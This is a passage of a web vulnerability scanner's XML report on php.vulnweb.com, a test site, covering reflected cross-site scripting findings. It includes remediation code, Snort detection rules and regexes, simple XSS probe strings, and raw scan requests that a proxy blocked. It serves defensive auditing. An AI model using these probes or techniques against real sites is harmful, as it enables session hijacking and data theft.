</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="A51D6BD7EAFA2F896800675D3959DB73"><![CDATA[GET /pictures/2.jpg.tn/%33%33%32%35%32 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="A51D6BD7EAFA2F896800675D3959DB73";PSID="F23F638F1BEFA4A9352351623ED5929E";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2533%2533%2532%2535%2532";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="63f39d32";
X-Request-Memo: ID="93bc354b";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3665
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/2.jpg.tn/33252");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:32</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="A51D6BD7EAFA2F896800675D3959DB73"><Method>GET</Method><Path>/pictures/2.jpg.tn/</Path><File>%33%33%32%35%32</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="A51D6BD7EAFA2F896800675D3959DB73";PSID="F23F638F1BEFA4A9352351623ED5929E";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2533%2533%2532%2535%2532";AttackStringProps="Attack";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="63f39d32";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="93bc354b";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/2.jpg.tn/33252");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:32</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3665</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="BC5C4E46D6B6FDD78DE6098D48C8DAF2"><URL>http://php.vulnweb.com:80/pictures/1.jpg.tn/%32%33%34%37%33</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="3611701c-f6d0-41ad-9182-c9582ff478d6"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /pictures/1.jpg.tn/%32%33%34%37%33 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="BC5C4E46D6B6FDD78DE6098D48C8DAF2";PSID="210657288A91100C4123A79F42F2ACAF";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2532%2533%2534%2537%2533";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="c22c1f98";
X-Request-Memo: ID="30aa8ed4";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2000" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
